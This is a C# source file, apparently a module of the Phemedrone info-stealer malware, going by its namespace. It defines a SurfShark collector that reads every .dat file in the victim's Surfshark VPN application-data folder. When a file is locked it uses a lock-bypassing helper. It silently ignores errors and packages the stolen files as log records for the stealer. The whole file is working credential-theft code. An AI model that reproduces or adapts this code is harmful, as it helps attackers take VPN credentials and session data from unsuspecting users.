using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Phemedrone;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace PhemedroneStealer.Services.VPN;

public class SurfShark : IService
{
    public override PriorityLevel Priority => PriorityLevel.Medium;
    protected override string GetServiceName() => "SurfShark";

    protected override LogRecord[] Collect()
    {
        var array = new List<LogRecord>();
        var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Surfshark");

        if (!Directory.Exists(vpn)) return array.ToArray();
        
        try
        {
            foreach (var file in Directory.GetFiles(vpn, "*.dat"))
            {

                var content = NullableValue.Call(() => File.ReadAllBytes(file));
                if (content == null)
                {
                    content = LockHelper.ReadFile(file);
                    
                    if (content == null) continue;
                }

                array.Add(new LogRecord
                {
                    Path = "VPN/SurfShark/" + file.Replace(vpn + "\\", null),
                    Content = content
                });

            }
        }
        catch
        {
            // ignored
        }

        return array.ToArray();
    }
}